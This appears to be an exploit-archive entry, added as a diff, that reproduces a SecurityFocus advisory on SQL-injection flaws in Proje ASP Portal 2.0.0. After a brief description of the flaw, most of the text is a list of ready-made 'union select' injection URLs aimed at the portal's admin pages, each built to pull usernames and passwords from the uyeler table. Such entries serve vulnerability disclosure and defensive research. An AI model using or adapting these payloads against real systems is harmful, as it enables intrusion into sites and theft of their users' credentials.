@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/29427/info
+
+Proje ASP Portal is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Proje ASP Portal 2.0.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/portal/yonetici/sayfalar.asp?islem=menuduzenle&id=3+union+select+0,kadi,sifre,3,4,5,6+from+uyeler
+http://www.example.com/portal/yonetici/bloklar.asp?islem=bloklar&id=1+union+select+0,sifre,kadi,null,4,5+from+uyeler
+http://www.example.com/portal/yonetici/chat.asp?islem=chat&id=1+union+select+0,sifre+from+uyeler
+http://www.example.com/portal/yonetici/dostsiteler.asp?islem=dost&id=8+union+select+0,kadi,2,sifre+from+uyeler
+http://www.example.com/portal/yonetici/dosya.asp?islem=dosyakategorisiduzenle&id=1+union+select+0,sifre,2,3+from+uyeler
+http://www.example.com/portal/yonetici/dosya.asp?islem=dosyakategorisiduzenle&id=1+union+select+0,kadi,2,3+from+uyeler
+http://www.example.com/portal/yonetici/haber.asp?islem=haber&id=1+union+select+0,1,2,kadi,sifre,5,6,7,8,9+from+uyeler
+http://www.example.com/portal/yonetici/ilan.asp?islem=ilankategorisiduzenle&id=1+union+select+0,sifre,2,3+from+uyeler
+http://www.example.com/portal/yonetici/oyun.asp?islem=oyunkategorisiduzenle&id=1+union+select+0,kadi+from+uyeler
+http://www.example.com/portal/yonetici/oyun.asp?islem=oyunkategorisiduzenle&id=1+union+select+0,sifre+from+uyeler
+http://www.example.com/portal/yonetici/resim.asp?islem=resimkategorisiduzenle&id=1+union+select+0,sifre+from+uyeler
+http://www.example.com/portal/yonetici/resim.asp?islem=resimkategorisiduzenle&id=1+union+select+0,kadi+from+uyeler
+http://www.example.com/portal/yonetici/toplist.asp?islem=toplistkategoriduzenle&id=1+union+select+0,sifre+from+uyeler
+http://www.example.com/portal/yonetici/toplist.asp?islem=toplistkategoriduzenle&id=1+union+select+0,kadi+from+uyeler
+http://www.example.com/portal/yonetici/video.asp?islem=videokategorisiduzenle&id=1+union+select+0,sifre+from+uyeler
+http://www.example.com/portal/yonetici/video.asp?islem=videokategorisiduzenle&id=1+union+select+0,kadi+from+uyeler
+http://www.example.com/portal/yonetici/yazi.asp?islem=yazialtkategoriduzenle&id=1+union+select+0,sifre,2,3+from+uyeler
+http://www.example.com/portal/yonetici/yazi.asp?islem=yazialtkategoriduzenle&id=1+union+select+0,kadi,2,3+from+uyeler
+http://www.example.com/portal/yonetici/uyeler.asp?islem=uyebilgi&id=1+union+select+0,1,2,3,4,sifre,kadi,7,8,1,1,1,1,1,1,9,1,0,1,1,1,1,1,1+from+uyeler 
